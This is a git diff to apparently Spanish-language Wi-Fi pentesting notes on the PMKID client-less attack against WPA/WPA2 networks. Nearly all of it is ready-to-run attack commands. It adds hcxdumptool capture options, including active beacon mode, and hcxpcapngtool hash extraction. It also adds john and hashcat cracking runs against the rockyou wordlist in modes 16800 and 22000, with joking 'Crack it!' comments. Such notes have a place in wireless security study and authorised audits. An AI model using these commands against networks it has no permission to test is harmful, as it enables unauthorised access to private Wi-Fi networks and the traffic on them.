@@ -2414,6 +2414,7 @@ En un ataque `PMKID/RSN`, el atacante busca obtener la `PMK` de la `WLAN` **sin 
 - [Hacktricks: PMKID](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi#pmkid)
 - [PWNing WPA/WPA2 networks with Bettercap and the PMKID client-less attack.](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
 - [Auditoria inalámbrica PMKID con Airgeddon](https://www.youtube.com/watch?v=A-ccvywjOKc)
+- [WiFi WPA/WPA2 vs hashcat and hcxdumptool](https://www.youtube.com/watch?v=Usw0IlGbkC4)
 
 ---
 
@@ -2427,8 +2428,11 @@ En un ataque `PMKID/RSN`, el atacante busca obtener la `PMK` de la `WLAN` **sin 
 # -o = output
 # --enable_status=1 
 
-# Comando:
+# Comando Opción 1:
 hcxdumptool -i wlan0mon -o Fz3r0_RSN_PMKID --enable_status=1
+
+# Comando Opción 2 (Bombal):
+hcxdumptool -i wlan0mon -o Fz3r0_RSN_PMKID.pcapng --active_beacon --enable_status=15 
 ````
 
 2. **`betterrcap`**: 
@@ -2455,6 +2459,14 @@ wifi.assoc all
 ./eaphammer --pmkid --interface wlan0mon --channel 6 --bssid 70:4C:A5:F8:9A:C1
 ````
 
+4. **`Wireshark`**
+
+- Solo es necesario capturar y la herramienta `hcxdumptool` podrá obtener el hash del archivo en caso de tener `PMKID`
+
+
+
+
+
 ---
 
 ### 🗡️🎩 Cracking: `PMKID`
@@ -2464,19 +2476,24 @@ wifi.assoc all
 ````sh
 # 1. Primero mostrar los hashes de la captura y guardarlos en un archivo
 # -z Nombre de archivo de hashes
-hcxdumptool -z Fz3r0_Hashes Fz3r0_RSN_PMKID
+
+# Opción 1: Simple
+hcxdumptool -z Fz3r0_Hash.hc16800 Fz3r0_RSN_PMKID
+
+# Opción 2: Bombal (Lista ESSID con pcapng)
+hcxpcapngtool -o Fz3r0_Hash.hc22000 -E essidlist Fz3r0_RSN_PMKID.pcapng
 
 # - Una vez guardados se pueden ver con un simple cat y poderlos empezar a crackear
-cat Fz3r0_Hashes
+cat Fz3r0_Hash.hc16800
 ````
 2. Cracking `PMKID hashes`: `john`
 
 ````sh
 # 1. Guárdame este fierrito, Crack it!
-john --wordlist=/usr/share/wordlists/rockyou.txt Fz3r0_Hashes
+john --wordlist=/usr/share/wordlists/rockyou.txt Fz3r0_Hash.hc16800
 
 # - Revisar la DB de john
-john --show Fz3r0_Hashes
+john --show Fz3r0_Hash.hc16800
 ````
 
 2. Cracking `PMKID hashes`: `hashcat`
@@ -2486,10 +2503,13 @@ john --show Fz3r0_Hashes
 hashcat --example-hashes | grep "16800" -C 2
 
 # Opción 1: Miau miau!!!, Crack it!
-hashcat -m 16800 -a 0 Fz3r0_Hashes /usr/share/wordlists/rockyou.txt
+hashcat -m 16800 -a 0 Fz3r0_Hash.hc16800 /usr/share/wordlists/rockyou.txt
 
 # Opción 2: Miau miau!!!, Crack it!
-hashcat -m 16800 --force Fz3r0_Hashes /usr/share/wordlists/rockyou.txt
+hashcat -m 16800 --force Fz3r0_Hash.hc16800 /usr/share/wordlists/rockyou.txt
+
+# Opción 3: Miau miau!!!, Crack it!
+hashcat -m 22000 Fz3r0_Hash.hc22000 /usr/share/wordlists/rockyou.txt
 
 # - Revisar la DB de hashcat
 hashcat -m 16800 --show Fz3r0_Hashes
